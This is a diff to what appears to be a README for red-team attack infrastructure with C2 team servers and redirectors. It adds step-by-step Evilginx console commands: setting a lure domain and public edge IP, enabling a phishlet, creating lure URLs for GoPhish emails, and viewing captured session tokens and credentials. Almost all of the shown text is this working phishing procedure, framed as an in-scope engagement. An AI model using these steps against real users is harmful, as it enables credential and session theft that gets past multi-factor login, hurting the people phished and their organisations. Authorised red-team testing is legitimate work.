@@ -89,3 +89,29 @@ The `31337` port and the heredoc comments (e.g., *"Sliver/Mythic console"*) are 
 2. Change the `31337` references (in `security_groups.tf` and the `outputs.tf` tunnel command) to your framework's operator/console port.
 3. Make sure the C2's listeners **bind to the team server's private IP** so the redirectors can reach them.
 
+# 1. SSH to Evilginx via the bastion
+ssh -J ubuntu@<bastion_ip> ubuntu@<evilginx_private_ip>
+
+# 2. Attach to the running Evilginx console
+sudo tmux attach -t evilginx
+
+# 3. Inside the Evilginx console, configure it:
+config domain   secure-portal.example-engagement.com
+# Use the PUBLIC edge IP victims will reach:
+#   - redirector public IP  (if redirector enabled)   <-- recommended
+#   - evilginx public IP    (if redirector disabled)
+config ipv4 external <PUBLIC_EDGE_IP>
+
+# 4. Set up a phishlet (must match the target service; in RoE scope)
+phishlets hostname <phishlet> secure-portal.example-engagement.com
+phishlets enable <phishlet>
+
+# 5. Create a lure and get its URL (this is what GoPhish links to)
+lures create <phishlet>
+lures get-url <id>
+
+# 6. Watch for captured sessions
+sessions
+sessions <id>      # view captured tokens/credentials
+
+# Detach without stopping Evilginx:  Ctrl-b  then  d
